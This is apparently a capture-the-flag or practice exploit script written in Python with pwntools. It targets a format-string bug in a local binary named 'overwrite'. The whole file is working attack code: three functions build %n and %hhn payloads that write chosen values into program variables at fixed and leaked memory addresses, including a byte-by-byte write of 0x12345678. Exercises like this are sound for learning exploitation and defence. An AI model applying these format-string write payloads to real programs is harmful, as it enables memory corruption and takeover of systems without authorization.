#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
local = 1
if local:
	p = process('./overwrite')
else:
	p = remote('127.0.0.1', 8888)

def modify_c():
	c_addr = int(p.recvuntil('\n', drop=True), 16)
	log.success('c_addr = ' + hex(c_addr))
	offset = 6
	num = 16
	payload = flat([c_addr, '%{}c'.format(str(num - 4)), '%{}$n'.format(str(offset))])
	print repr(payload)
	p.sendline(payload)
	print repr(p.recv())
	p.close()

def modify_a():
	a_addr = 0x0804A024
	log.success('a_addr = ' + hex(a_addr))
	offset = 8
	num = 2
	payload = flat(['AA%{}$nBB'.format(str(offset)), p32(a_addr)])
	print repr(payload)
	p.sendline(payload)
	print repr(p.recv())
	p.close()

def modify_b():
	b_addr = 0x0804A028
	num = 0x12345678
	offset = 6
	payload = ''.join(p32(b_addr + i) for i in range(4))
	printed = len(payload)
	fmt1 = '%{}c'
	fmt2 = '%{}$hhn'
	for i in range(4):
		byte = (num >> (i * 8)) & 0xff
		addition = (byte - printed + 256) % 256
		if addition > 0:
			payload += fmt1.format(str(addition))
		payload += fmt2.format(str(offset + i))
		printed += addition
	print repr(payload)
	p.sendline(payload)
	print repr(p.recv())
	p.close()

modify_c()
# modify_a()
# modify_b()
